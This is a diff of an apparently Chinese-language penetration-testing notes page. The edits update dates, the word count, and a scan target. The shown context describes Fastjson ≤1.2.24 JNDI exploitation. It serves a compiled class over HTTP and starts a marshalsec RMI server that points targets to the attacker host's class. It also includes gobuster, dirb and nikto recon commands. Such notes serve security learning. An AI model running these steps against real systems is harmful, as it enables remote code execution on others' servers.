@@ -49,7 +49,7 @@
         content="2021-12-02">
       <meta 
         property="og:article:modified_time" 
-        content="2022-03-08">
+        content="2022-08-03">
       <meta 
         property="og:article:author" 
         content="CBear">
@@ -325,7 +325,7 @@
     
     
       <span class="dot"></span>
-      <span>2.6k words</span>
+      <span>2.7k words</span>
     
   </div>
   
@@ -586,7 +586,7 @@ run  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></spa
 <p>通过 <code>javac TouchFile.java</code> 将 <strong>.java</strong>代码 编译成 <strong>.class</strong>类，并在类所在文件夹搭建http服务 <code>python3 -m http.server &lt;http端口&gt;</code> 或 <code>python -m SimpleHTTPServer &lt;http端口&gt;</code> 。  </p>
 </blockquote>
 <h4 id="u5F00_u542FRMI_u670D_u52A1"><a href="#u5F00_u542FRMI_u670D_u52A1" class="headerlink" title="开启RMI服务"></a>开启RMI服务</h4><blockquote>
-<p>在marshalsec目录，执行命令，开启RMI服务，映射&lt;http端口&gt;为&lt;rmi服务监听端口&gt;，并制定加载远程类 &lt;类名&gt;.class<br><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer <span class="token string">"http://&lt;攻击机ip>:&lt;http端口>/#&lt;类名>"</span> <span class="token operator">&lt;</span>rmi服务监听端口<span class="token operator">></span>  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
+<p>在marshalsec目录，执行命令，开启RMI服务，映射&lt;http端口&gt;为&lt;rmi服务监听端口&gt;，并制定加载远程类 &lt;类名&gt;.class，(注意rmi地址访问的是类名，不需要.class)<br><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer <span class="token string">"http://&lt;攻击机ip>:&lt;http端口>/#&lt;类名>"</span> <span class="token operator">&lt;</span>rmi服务监听端口<span class="token operator">></span>  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
 </blockquote>
 <h4 id="POST_json_u5BF9_u8C61"><a href="#POST_json_u5BF9_u8C61" class="headerlink" title="POST json对象"></a>POST json对象</h4><blockquote>
 <p>构建Payload，将自定义json对象POST至目标服务器<br><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">// Fastjson &lt;= 1.2.24  </span>
@@ -649,7 +649,7 @@ run  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></spa
 </ul>
 </blockquote>
 <h2 id="u626B_u76EE_u5F55"><a href="#u626B_u76EE_u5F55" class="headerlink" title="扫目录"></a>扫目录</h2><blockquote>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gobuster <span class="token function">dir</span> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.228.131/ -x php,html,txt  
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gobuster <span class="token function">dir</span> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.1.158:3600/vulnerabilities/ -x php,html,txt  
 dirb http://192.168.228.131  
 nikto -h <span class="token number">192.168</span>.228.131  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></blockquote>
 
